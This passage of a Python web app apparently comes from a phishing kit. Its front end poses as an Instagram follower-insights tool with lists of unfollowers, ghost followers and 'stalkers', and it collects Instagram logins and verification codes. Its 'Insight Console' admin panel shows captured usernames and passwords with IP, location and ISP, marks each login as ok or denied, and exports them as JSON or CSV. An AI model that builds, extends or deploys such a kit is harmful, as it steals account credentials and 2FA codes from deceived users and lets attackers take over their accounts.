 ghosts:S('<path d="M5 21V11a7 7 0 0 1 14 0v10l-3-2-2 2-2-2-2 2-2-2z"/><circle cx="9.5" cy="11" r=".6"/><circle cx="14.5" cy="11" r=".6"/>'),
 stalkers:S('<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>'),
 act:S('<path d="M12 21s-8-5.5-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.5-8 11-8 11z"/>'),
 broken:S('<path d="M12 21s-8-5.5-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.5-8 11-8 11z"/><path d="m12 7.5-2 4 3 1-1 4"/>'),
 trash:S('<path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/>'),
 chat:S('<path d="M21 12a8 8 0 0 1-11.7 7L3 21l2-5.5A8 8 0 1 1 21 12z"/>'),
 out:S('<path d="M9 4H4v16h5M16 8l4 4-4 4M20 12H9"/>'),
 plus:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M19 8v6M16 11h6"/>'),
 set:S('<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/>'),
 refresh:S('<path d="M21 12a9 9 0 1 1-3-6.7M21 3v6h-6"/>')
};
const VF='<svg class="vf" viewBox="0 0 24 24"><path d="M12 1.5l2.6 1.8 3.1-.2 1.2 2.9 2.7 1.6-.7 3 1 2.9-2.2 2.2-.4 3.1-3 .7-2.2 2.2L12 19.8 9 21l-2.5-2.1-3-.7-.4-3.1L1 12.8l1-2.9-.7-3 2.7-1.6 1.2-2.9 3.1.2z"/><path d="m8 12.3 2.8 2.8L16.5 9" fill="none" stroke="#fff" stroke-width="2"/></svg>';
const G=["#fa7e1e,#d62976","#d62976,#962fbf","#4f5bd5,#962fbf","#0095f6,#4f5bd5","#feda75,#fa7e1e","#2ecc71,#0095f6"];
const ESC=s=>String(s==null?"":s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));

const D={notback:[],fans:[],ghosts:[],stalkers:[],act:[]};
let PF={username:"your.handle",full_name:"",bio:"",pic:"",followers:0,following:0,media:0};
let PHASE="loading",ERR="",NOTICE="",CHOICE="";

const T=[["home","Overview"],["notback","Not Following Back"],["ghosts","Ghost Followers"],["stalkers","Profile Stalkers"],["act","Activity"]];
let tab="home",q="",f="all",anim=true;
let theme="system";
try{theme=localStorage.getItem("ins-theme")||"system"}catch(e){}
const P={likes:true,comm:true,unf:true,stalk:false,priv:false};
try{Object.assign(P,JSON.parse(localStorage.getItem("ins-prefs")||"{}"))}catch(e){}
function savePrefs(){try{localStorage.setItem("ins-prefs",JSON.stringify(P))}catch(e){}}
function applyTheme(){const r=document.documentElement;theme==="system"?r.removeAttribute("data-theme"):r.setAttribute("data-theme",theme)}
const eff=()=>theme==="dark"||(theme==="system"&&matchMedia("(prefers-color-scheme: dark)").matches);
applyTheme();
const $=s=>document.querySelector(s);
const gr=i=>{const [a,b]=G[i%G.length].split(",");return `linear-gradient(135deg,${a},${b})`};
const ini=n=>String(n||"?").split(/[ ._]/).filter(Boolean).map(w=>w[0]).join("").slice(0,2).toUpperCase()||"?";
const av=(x,i,c="s")=>x.pic
 ?`<div class="ring ${c}"><span style="background-image:url('${ESC(x.pic)}');background-size:cover;background-position:center"></span></div>`
 :`<div class="ring ${c}"><span style="background:${gr(i)}">${ini(x.h||x.n)}</span></div>`;

function mapState(s){
 PHASE=s.phase||"error";ERR=s.error||"";NOTICE=s.notice||"";CHOICE=s.choice||"";
 if(s.profile&&s.profile.username)PF=s.profile;
 const L=s.lists||{};
 D.notback=(L.notback||[]).map(x=>({n:x.full_name||x.username,h:x.username,m:"You follow · not following back",v:x.verified?1:0,pk:x.pk,pic:x.pic}));
 D.fans=(L.fans||[]).map(x=>({n:x.full_name||x.username,h:x.username,m:"Follows you",v:x.verified?1:0,pk:x.pk,pic:x.pic}));
 D.ghosts=(L.ghosts||[]).map(x=>({n:x.full_name||x.username,h:x.username,m:"No likes, comments or views",v:x.verified?1:0,pk:x.pk,pic:x.pic}));
 D.stalkers=(L.stalkers||[]).map(x=>({n:x.full_name||x.username,h:x.username,c:x.views,m:"Story views",v:x.verified?1:0,pk:x.pk,pic:x.pic}));
 D.act=(L.activity||[]).map(x=>({
  g:"Recent",
  i:{unfollow:"out",follow:"plus",like:"broken",unfollowed:"trash",followed:"plus"}[x.kind]||"act",
  t:ESC(x.text),
  s:new Date((x.ts||0)*1000).toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"}),
  tg:x.kind==="follow"?["","New follower"]:x.kind==="followed"?["","You followed"]:x.kind==="like"?["red","Like removed"]:["red","Unfollow"]}));
}

async function load(){
 try{
  const r=await fetch("/api/state",{credentials:"same-origin"});
  if(!r.ok) throw 0;
  mapState(await r.json());
 }catch(e){PHASE="error";ERR="Connection lost."}
 render(true);
}
async function sync(){
 toast("Syncing…");
 try{await fetch("/api/sync",{method:"POST",credentials:"same-origin"})}catch(e){}
 setTimeout(load,600);
}
async function sendCode(v){
 const el=$("#code");
 const val=v===undefined?(el?el.value:""):v;
 try{await fetch("/api/code",{method:"POST",credentials:"same-origin",headers:{"Content-Type":"application/json"},body:JSON.stringify({code:val})})}catch(e){}
 setTimeout(load,500);
}

function nav(){
 const cn={notback:D.notback.length,ghosts:D.ghosts.length};
 $("#nav").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${l}">${I[k]}${l}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
 $("#bn").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${l}">${I[k]}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
 $("#nav").insertAdjacentHTML("beforeend",`<button class="${tab==="settings"?"on":""}" data-k="settings">${I.set}Settings</button>`);
 $("#mh").innerHTML=I.set;$("#mh").onclick=()=>go("settings");
 document.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
}
function go(k){tab=k;q="";f="all";anim=true;render();$("#main").scrollTop=0}
const card=(k,l,n,s,c="")=>`<div class="card" data-k="${k}"><small>${l}${I[k]}</small><b data-num="${n||0}">0</b><i class="${c}">${s}</i></div>`;

function countUp(root){
 root.querySelectorAll("[data-num]").forEach(el=>{
  const target=parseInt(el.dataset.num||"0",10)||0;
  if(!target){el.textContent="0";return}
  const t0=performance.now(),dur=760;
  function step(t){
   const p=Math.min(1,(t-t0)/dur),e=1-Math.pow(1-p,3);
   el.textContent=Math.round(target*e);
   if(p<1)requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
 });
}
function tilt(root){
 root.querySelectorAll(".card").forEach(c=>{
  c.addEventListener("pointermove",e=>{
   const r=c.getBoundingClientRect();
   c.style.setProperty("--ry",((e.clientX-r.left)/r.width-.5)*11+"deg");
   c.style.setProperty("--rx",(-(e.clientY-r.top)/r.height+.5)*11+"deg");
  });
  c.addEventListener("pointerleave",()=>{c.style.setProperty("--rx","0deg");c.style.setProperty("--ry","0deg")});
 });
}
function ripple(el,ev){
 const r=el.getBoundingClientRect(),s=Math.max(r.width,r.height);
 const d=document.createElement("span");
 d.className="rip";d.style.width=d.style.height=s+"px";
 d.style.left=(ev.clientX-r.left-s/2)+"px";d.style.top=(ev.clientY-r.top-s/2)+"px";
 el.appendChild(d);setTimeout(()=>d.remove(),650);
}

function loadingView(){
 const m={queued:"Starting…",login:"Logging in to Instagram…",sync:"Loading your followers…",approve:"Approve the login in the Instagram app"}[PHASE]||"Loading…";
 if(PHASE==="error")return `<div class="empty" style="padding-top:70px"><div class="ttl">Login not confirmed</div><p class="sub">${ESC(ERR||"Unknown error")}</p><button class="btn" id="retry">Try again</button><p class="sub" style="margin-top:18px"><a href="/logout">Use another account</a></p></div>`;
 if(PHASE==="code")return `<div class="empty" style="padding-top:40px"><div class="ttl">Verification code</div><p class="sub">Instagram sent a code by ${ESC(CHOICE||"email")}. Enter it below.</p><div class="bar" style="justify-content:center"><input class="search" id="code" inputmode="numeric" autocomplete="one-time-code" placeholder="123456" style="max-width:200px;text-align:center;letter-spacing:.3em"><button class="btn" id="cbtn">Send</button></div><p class="sub" style="margin-top:14px">Or approve in the app and press Continue.</p><button class="btn g" id="cont">Continue</button></div>`;
 return `<div class="sk top"></div><div class="empty" style="padding:6px 0 0"><div class="ttl">${ESC(m)}</div><p class="sub">${ESC(PF.username||"")}</p></div><div class="skw"><div class="sk"></div><div class="sk"></div></div>${PHASE==="approve"?`<div style="text-align:center;margin-top:18px"><button class="btn" id="cont">Continue</button></div>`:""}`;
}

function home(){
 const st=D.stalkers.slice(0,7),mx=Math.max(1,...st.map(x=>x.c||1));
 const k=n=>D.act.filter(x=>x.i===n).length;
 return `<div class="prof"><div class="ring l">${PF.pic?`<span style="background-image:url('${ESC(PF.pic)}');background-size:cover;background-position:center"></span>`:`<span style="background:linear-gradient(135deg,#262626,#444)">${ini(PF.username)}</span>`}</div>
 <div class="pi"><div class="h"><h2>${ESC(PF.username)}</h2><button class="btn g" id="sync">Sync</button></div>
 <div class="st"><div><b data-num="${PF.media||0}">0</b> posts</div><div><b data-num="${PF.followers||0}">0</b> followers</div><div><b data-num="${PF.following||0}">0</b> following</div></div>
 <p><b>${ESC(PF.full_name||"")}</b><br><span>${ESC(PF.bio||"Live data from Instagram")}</span></p></div></div>
 ${NOTICE?`<p class="sub">${ESC(NOTICE)}</p>`:""}
 <div class="sec" style="margin-top:6px"><h3>Top story viewers</h3><a data-k="stalkers">See all</a></div>
 <div class="stories">${st.length?st.map((x,i)=>`<div data-k="stalkers"><div class="ring" style="padding:3px"><span style="background:${gr(i)}">${ini(x.h)}</span></div><em>${x.c}</em><small>${ESC(x.h)}</small></div>`).join(""):`<div style="width:100%;color:var(--mut);font-size:13px;padding:8px 0">No active story — post one, then sync</div>`}</div>
 <div class="sec"><h3>Insights</h3></div>
 <div class="cards">
  ${card("notback","Not following back",D.notback.length,"Unfollow from here")}
  ${card("ghosts","Ghost followers",D.ghosts.length,"Zero engagement","dn")}
  ${card("stalkers","Story viewers",D.stalkers.length,"Real views","up")}
  ${card("act","Removed likes",k("broken"),"Recent syncs","dn")}
  ${card("act","Unfollowed you",k("out"),"Recent syncs","dn")}
  ${card("act","New followers",k("plus"),"Recent syncs","up")}
 </div>
 <div class="sec"><h3>Overview</h3></div>
 <div class="two">
  <div class="panel"><h4>Follower health</h4><div class="donut"><svg viewBox="0 0 42 42"><circle cx="21" cy="21" r="15.9" fill="none" stroke="var(--chip)" stroke-width="4.5"/><circle cx="21" cy="21" r="15.9" fill="none" stroke="#d62976" stroke-width="4.5" stroke-dasharray="62 38" transform="rotate(-90 21 21)" stroke-linecap="round"/><circle cx="21" cy="21" r="15.9" fill="none" stroke="#0095f6" stroke-width="4.5" stroke-dasharray="22 78" stroke-dashoffset="-65" transform="rotate(-90 21 21)" stroke-linecap="round"/></svg>
  <div class="leg"><div><em style="background:#d62976"></em><b>${D.notback.length}</b> Not back</div><div><em style="background:#0095f6"></em><b>${D.fans.length}</b> Fans</div><div><em style="background:var(--chip)"></em><b>${D.ghosts.length}</b> Ghosts</div></div></div></div>
  <div class="panel"><h4>Story views · top 7</h4><div class="spark">${st.length?st.map((x,i)=>`<i style="height:${Math.round((x.c||1)/mx*100)}%;animation-delay:${i*70}ms"></i>`).join(""):`<i style="height:20%"></i>`}</div><div class="sl">${st.map(x=>`<span>${ESC(x.h.slice(0,3))}</span>`).join("")}</div></div>
 </div>`;
}

function actList(a){
 if(!a.length)return `<div class="empty">Nothing yet — sync twice and diffs appear here.</div>`;
 let g="",o="";
 a.forEach((x,i)=>{
  if(x.g!==g){g=x.g;o+=`<div class="day">${g}</div>`}
  o+=`<div class="row" style="animation-delay:${i*50}ms"><div class="ic">${I[x.i]||I.act}</div><div class="info"><b style="font-weight:400;white-space:normal">${x.t}</b><small>${x.s} · <span class="tag ${x.tg[0]}">${x.tg[1]}</span></small></div></div>`});
 return o;
}

function rows(k,list){
 if(!list.length)return `<div class="empty">Nothing here yet.</div>`;
 return list.map((x,i)=>{
  let t="",b="";
  if(k==="notback")b=`<button class="btn r" data-un="${ESC(x.pk)}" data-u="${ESC(x.h)}">Unfollow</button>`;
  if(k==="ghosts"){t=`<span class="tag red">ghost</span>`;b=`<button class="btn r" data-un="${ESC(x.pk)}" data-u="${ESC(x.h)}">Unfollow</button>`}
  if(k==="stalkers"){t=`<span class="tag hot">${x.c} views</span>`;b=`<button class="btn" data-fo="${ESC(x.pk)}" data-u="${ESC(x.h)}">Follow</button>`}
  if(k==="fans")b=`<button class="btn" data-fo="${ESC(x.pk)}" data-u="${ESC(x.h)}">Follow back</button>`;
  return `<div class="row" style="animation-delay:${i*50}ms">${av(x,i,"s"+(k==="ghosts"?" off":""))}<div class="info"><b>${ESC(x.h)}${x.v?VF:""}${t}</b><small>${ESC(x.n)} · ${ESC(x.m)}</small></div>${b}</div>`}).join("");
}

function lv(k,t,s,ch){
 let l=D[k].filter(x=>(x.n+x.h).toLowerCase().includes(q.toLowerCase()));
 if(f==="ver")l=l.filter(x=>x.v);if(f==="top")l=l.filter(x=>x.c>=7);
 return `<h1 class="ttl">${t}</h1><p class="sub">${s}</p><div class="bar"><input class="search" id="s" placeholder="Search" value="${ESC(q)}">${ch.map(([v,lb])=>`<button class="chip ${f===v?"on":""}" data-f="${v}">${lb}</button>`).join("")}</div>${rows(k,l)}`;
}

function settings(){
 const sw=(k,l,s)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><button class="sw ${P[k]?"on":""}" data-p="${k}" role="switch" aria-checked="${P[k]}" aria-label="${l}"></button></div>`;
 const th=(a,l,s,on)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b><small>${s}</small></div><button class="sw ${on?"on":""}" data-th="${a}" role="switch" aria-checked="${on}" aria-label="${l}"></button></div>`;
 const lk=(l,s,c)=>`<div class="srow lk ${c||""}"><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><span class="ch">›</span></div>`;
 return `<h1 class="ttl">Settings</h1><p class="sub">Manage your appearance, alerts and account.</p>
 <div class="acc">${av({h:PF.username,pic:PF.pic},0,"m")}<div class="info"><b>${ESC(PF.username)}</b><small>${ESC(PF.full_name||"Instagram account")}</small></div><button class="btn g" id="sync">Sync</button></div>
 <div class="sec"><h3>Appearance</h3></div>
 ${th("dark","Dark mode","Switch between light and dark appearance",eff())}
 ${th("sys","Use device settings","Match your phone or computer’s appearance automatically",theme==="system")}
 <div class="sec"><h3>Notifications</h3></div>
 ${sw("likes","Removed likes","Tell me when someone takes back a like")}
 ${sw("comm","Deleted comments","Tell me when a comment disappears")}
 ${sw("unf","Unfollows","Tell me when someone unfollows you")}
 ${sw("stalk","Story view alerts","Notify me about repeat viewers")}
 <div class="sec"><h3>Privacy</h3></div>
 ${sw("priv","Hide my activity status","Others can’t see when you’re active")}
 ${lk("Blocked accounts","")}
 ${lk("Sync now","Pull followers again")}
 <div class="sec"><h3>Account</h3></div>
 ${lk("Linked Instagram account","@"+ESC(PF.username))}
 ${lk("Download your data","")}
 ${lk("Help","")}
 ${lk("Log out","Sign out of this device","red")}`;
}

function render(keep){
 if(!$("#main"))return;
 nav();
 const m=$("#main");let h;
 if(PHASE!=="ready")h=loadingView();
 else if(tab==="home")h=home();
 else if(tab==="notback")h=lv("notback","Not following back","Accounts you follow that don’t follow you.",[["all","All"],["ver","Verified"]])+`<div class="sec"><h3>Following you · you don’t follow</h3></div>${rows("fans",D.fans.slice(0,30))}`;
 else if(tab==="ghosts")h=lv("ghosts","Ghost followers","They follow you but never like, comment or view.",[["all","All"]]);
 else if(tab==="stalkers")h=lv("stalkers","Story viewers","Who keeps checking your stories the most.",[["all","All"],["top","Top"]]);
 else if(tab==="settings")h=settings();
 else h=`<h1 class="ttl">Activity</h1><p class="sub">Unfollows, new followers, removed likes.</p>${actList(D.act)}`;
 const sc=keep?m.scrollTop:0;
 m.innerHTML=`<div class="in ${anim?"swap":""}">${h}</div>`;anim=false;
 m.scrollTop=sc;

 if(!keep){countUp(m);tilt(m)}

 const s=$("#s");if(s)s.oninput=e=>{q=e.target.value;const p=e.target.selectionStart;render(true);const n=$("#s");if(n){n.focus();n.setSelectionRange(p,p)}};
 m.querySelectorAll("[data-f]").forEach(b=>b.onclick=()=>{f=b.dataset.f;render(true)});
 m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];savePrefs();render(true)});
 m.querySelectorAll("[data-th]").forEach(b=>b.onclick=()=>{const d=eff();theme=b.dataset.th==="dark"?(d?"light":"dark"):(theme==="system"?(d?"dark":"light"):"system");try{localStorage.setItem("ins-theme",theme)}catch(e){}applyTheme();render(true);toast(theme==="system"?"Using device appearance":(theme==="dark"?"Dark mode on":"Light mode on"))});
 m.querySelectorAll(".srow.lk:not(.red)").forEach(b=>{ if(b.textContent.indexOf("Sync now")>-1) b.onclick=()=>sync(); });
 m.querySelectorAll(".srow.red").forEach(b=>b.onclick=()=>{b.style.pointerEvents="none";b.style.opacity=".55";toast("Logging out…");setTimeout(()=>{location.href="/logout"},480)});
 m.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
 m.querySelectorAll("[data-un]").forEach(b=>b.onclick=()=>act("/api/unfollow",b,"Unfollowed "));
 m.querySelectorAll("[data-fo]").forEach(b=>b.onclick=()=>act("/api/follow",b,"Followed "));
 const sy=$("#sync");if(sy)sy.onclick=()=>sync();
 const cb=$("#cbtn");if(cb)cb.onclick=()=>sendCode();
 const ci=$("#code");if(ci){ci.onkeydown=e=>{if(e.key==="Enter")sendCode()};ci.focus()}
 const co=$("#cont");if(co)co.onclick=()=>sendCode("");
 const rt=$("#retry");if(rt)rt.onclick=()=>sync();
}

async function act(url,btn,label){
 btn.disabled=true;btn.textContent="…";
 try{
  const r=await fetch(url,{method:"POST",credentials:"same-origin",headers:{"Content-Type":"application/json"},body:JSON.stringify({pk:btn.dataset.un||btn.dataset.fo,username:btn.dataset.u})});
  const d=await r.json();
  if(d.ok){btn.textContent="done";btn.className="btn g";toast(label+btn.dataset.u);setTimeout(load,400);return}
  btn.textContent="failed";toast(d.error||"failed");btn.disabled=false;
 }catch(e){btn.textContent="failed";btn.disabled=false}
}

let tt;function toast(t){const e=$("#toast");e.textContent=t;e.classList.add("show");clearTimeout(tt);tt=setTimeout(()=>e.classList.remove("show"),1900)}
document.addEventListener("pointerdown",e=>{
 const b=e.target.closest(".btn,.chip,.sw");
 if(b&&!b.disabled)ripple(b,e);
},{passive:true});
render();
load();
setInterval(load,4000);
</script>
</body>
</html>
"""

# ============================== admin console ==============================
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Insight Console</title>
<style>
:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#2ecc71;--bad:#ff5d6c;--warn:#f5b642;--u:#4fd6ff;--p:#ff8ad8}
*{box-sizing:border-box;margin:0}
body{background:var(--bg);color:var(--tx);font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
header{display:flex;gap:10px;align-items:center;padding:14px 20px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#0a0a0cf2;backdrop-filter:blur(10px);z-index:5;flex-wrap:wrap}
h1{font-size:15px;letter-spacing:.14em;text-transform:uppercase;font-weight:700}
h1 i{color:var(--acc);font-style:normal;animation:blink 2.6s ease-in-out infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.35}}
.spacer{flex:1}
.stat{font-size:12px;color:var(--mut);border:1px solid var(--line);border-radius:8px;padding:4px 10px}
.stat b{color:var(--tx)}
a.btn,button.btn{background:var(--card);border:1px solid var(--line);color:var(--tx);padding:6px 12px;border-radius:8px;cursor:pointer;text-decoration:none;font:inherit;font-size:12px;transition:.2s cubic-bezier(.2,1.4,.4,1)}
a.btn:hover,button.btn:hover{border-color:var(--acc);color:var(--acc);transform:translateY(-1px)}
a.btn:active,button.btn:active{transform:scale(.95)}
button.cp{padding:2px 7px;font-size:10.5px;border-radius:6px;border-color:#2c2c36;color:var(--mut);vertical-align:middle}
button.cp:hover{border-color:var(--acc);color:var(--acc)}
main{padding:18px 20px 60px}
table{width:100%;border-collapse:collapse;font-size:12.5px}
th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
th{color:var(--mut);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.08em}
tr{transition:background .25s}
tr:hover td{background:#15151b}
tr.flash td{animation:fl 1.2s cubic-bezier(.2,1,.4,1)}
@keyframes fl{0%{background:#1b2a3d}100%{background:transparent}}
td a{color:var(--acc);text-decoration:none}
td a:hover{text-decoration:underline}
.u{color:var(--u);word-break:break-all}
.p{color:var(--p);word-break:break-all}
.mono{font-size:11.5px;color:var(--mut);max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
pre{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:420px}
pre b{color:var(--acc)}
.block{margin-bottom:16px}
.block h2{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--mut);margin-bottom:6px;display:flex;gap:8px;align-items:center}
.cred{background:#171408;border:1px solid #6b4d1e;border-radius:12px;padding:14px;
  animation:glow 3.4s ease-in-out infinite}
@keyframes glow{0%,100%{box-shadow:0 0 0 rgba(107,77,30,0)}50%{box-shadow:0 0 24px rgba(107,77,30,.55)}}
.cred pre{background:#0f0d05;border-color:#6b4d1e;color:#ffe08a}
.cred .row{display:flex;gap:10px;align-items:center;margin-bottom:10px;flex-wrap:wrap}
.cred .k{color:#b99a4e;font-size:11px;text-transform:uppercase;letter-spacing:.1em;min-width:78px}
.cred .v{font-size:15px;font-weight:700;word-break:break-all}
.cred .v.u{color:var(--u)}
.cred .v.p{color:var(--p)}
.empty{padding:60px 0;text-align:center;color:var(--mut);animation:fade .5s ease both}
@keyframes fade{from{opacity:0;transform:translateY(8px)}}
.warn{background:#231a08;border:1px solid #6b4d1e;color:var(--warn);padding:10px 14px;border-radius:10px;margin-bottom:16px;font-size:12.5px}
form.inline{display:inline}
.bar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
.bar input{flex:1;min-width:200px;background:#141419;border:1px solid #232329;color:#ececf1;padding:9px 12px;border-radius:9px;font:inherit;font-size:12.5px;outline:none;transition:border-color .25s,box-shadow .25s}
.bar input:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(59,167,255,.16)}
.chip{border:1px solid var(--line);background:var(--card);color:var(--mut);padding:6px 11px;border-radius:8px;font:inherit;font-size:11.5px;text-decoration:none;transition:.2s}
.chip:hover{border-color:var(--acc);color:var(--acc);transform:translateY(-1px)}
.chip.on{background:var(--acc);border-color:var(--acc);color:#001522;font-weight:700}
.tag{font-size:10px;padding:1px 6px;border-radius:5px;background:#2a2110;color:var(--warn);border:1px solid #6b4d1e}
.tag.ok{background:#0f2417;color:var(--ok);border-color:#1d5233}
.tag.bad{background:#2a1013;color:var(--bad);border-color:#6b1e26}
.isp{color:var(--mut);font-size:11px;display:block;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
@media (max-width:640px){
  header{padding:10px 12px;gap:6px}
  main{padding:12px 12px 60px}
  th:nth-child(3),td:nth-child(3),th:nth-child(7),td:nth-child(7){display:none}
}
@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
</style></head><body>
<header>
  <h1><i>▚</i> Insight Console</h1>
  <span class="stat">credentials <b>__LOGS__</b></span>
  <span class="stat" id="live">live</span>
  <button class="btn" id="pause" type="button">pause</button>
  <span class="spacer"></span>
  <a class="btn" href="/admin/export?fmt=json">export json</a>
  <a class="btn" href="/admin/export?fmt=csv">export csv</a>
  <form class="inline" method="post" action="/admin/delete-all"
        onsubmit="return confirm('delete every captured credential?')">
    <input type="hidden" name="_csrf" value="__CSRF__">
    <button class="btn" type="submit">clear all</button>
  </form>
</header>
<main>__BODY__</main>
<script>
(function(){
  var feed = document.getElementById('feed');
  if (!feed) return;
  var params = new URLSearchParams(location.search);
  var q = params.get('q') || '';
  var only = params.get('only') || '';
  var last = 0, paused = false;
  var live = document.getElementById('live');
  var pause = document.getElementById('pause');
  if (pause) pause.onclick = function () {
    paused = !paused;
    pause.textContent = paused ? 'resume' : 'pause';
    live.textContent = paused ? 'paused' : 'live';
    live.style.color = paused ? 'var(--warn)' : '';
  };
  async function tick(){
    if (paused) return;
    try{
      var url = '/admin/feed?since=' + last
        + (q ? '&q=' + encodeURIComponent(q) : '')
        + (only ? '&only=' + encodeURIComponent(only) : '');
      var r = await fetch(url, {credentials:'same-origin'});
      if (!r.ok) throw 0;
      var d = await r.json();
      if (d.rows.length){
        feed.insertAdjacentHTML('afterbegin', d.rows.join(''));
        last = d.last;
        var fresh = Array.prototype.slice.call(feed.querySelectorAll('tr'), 0, d.rows.length);
        fresh.forEach(function (tr) {
          tr.classList.add('flash');
          setTimeout(function () { tr.classList.remove('flash'); }, 1300);
        });
        live.textContent = 'live · ' + new Date().toLocaleTimeString();
        live.style.color = 'var(--ok)';
      }
    }catch(e){ live.textContent = 'offline'; live.style.color = 'var(--bad)'; }
  }
  tick(); setInterval(tick, 4000);
})();
function cp(el){
  var t = el.previousElementSibling;
  if (!t) return;
  navigator.clipboard.writeText(t.textContent).then(function(){
    var old = el.textContent; el.textContent = 'copied';
    setTimeout(function(){ el.textContent = old; }, 1100);
  });
}
</script>
</body></html>
"""

LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Console</title>
<style>body{margin:0;min-height:100dvh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
font-family:ui-monospace,Menlo,monospace;padding:16px}form{background:#141419;border:1px solid #232329;
padding:26px;border-radius:14px;display:grid;gap:10px;width:100%;max-width:300px;
animation:in .5s cubic-bezier(.2,1.2,.4,1) both}
@keyframes in{from{opacity:0;transform:translateY(14px) scale(.97)}}
h1{font-size:13px;letter-spacing:.15em;text-transform:uppercase;margin:0 0 6px}
input{background:#0a0a0c;border:1px solid #232329;color:#ececf1;padding:10px 12px;border-radius:9px;font:inherit;outline:none;transition:border-color .25s,box-shadow .25s}
input:focus{border-color:#3ba7ff;box-shadow:0 0 0 3px rgba(59,167,255,.18)}
button{background:#3ba7ff;border:0;color:#001522;font:inherit;font-weight:700;
padding:10px;border-radius:9px;cursor:pointer;transition:transform .2s cubic-bezier(.2,1.4,.4,1),filter .2s}
button:hover{filter:brightness(1.1)}button:active{transform:scale(.96)}</style></head><body>
<form method="get" action="/admin"><h1>insight console</h1>
<input type="password" name="token" placeholder="admin token" autofocus>
<button type="submit">unlock</button></form></body></html>"""

ADMIN_SELECT = """SELECT c.id, c.created_at, c.ip, c.ua, c.source, c.username, c.password,
                         c.country, c.city, c.isp, c.verdict FROM creds c"""


def render_admin(body: str) -> str:
    conn = connect()
    try:
        logs = conn.execute("SELECT COUNT(*) c FROM creds").fetchone()["c"]
    finally:
        conn.close()
    return (ADMIN_HTML
            .replace("/admin", ADMIN_BASE)
            .replace("__BODY__", body)
            .replace("__LOGS__", str(logs))
            .replace("__CSRF__", csrf_token()))


def verdict_tag(verdict: str) -> str:
    if verdict == "ok":
        return '<span class="tag ok">ok</span> '
    if verdict == "wrong_account":
        return '<span class="tag bad">wrong account</span> '
    if verdict in DENIED_VERDICTS:
        return '<span class="tag bad">denied</span> '
    if verdict:
        return f'<span class="tag">{escape(verdict)}</span> '
    return ""


def row_html(r: sqlite3.Row) -> str:
    place = ", ".join(x for x in (r["city"], r["country"]) if x) or "-"
    partial = "" if (r["password"] or "") else '<span class="tag">partial</span> '
    return (
        f'<tr data-id="{r["id"]}">'
        f'<td>{r["id"]}</td>'
        f'<td>{(r["created_at"] or "")[11:19]}</td>'
        f'<td>{escape(place)}'
        + (f'<span class="isp">{escape(r["isp"] or "")}</span>' if r["isp"] else "")
        + f'</td>'
        f'<td>{escape(r["ip"] or "-")}</td>'
        f'<td class="u">{partial}{verdict_tag(r["verdict"] or "")}'
        f'<span>{escape(r["username"] or "")}</span> '
        f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
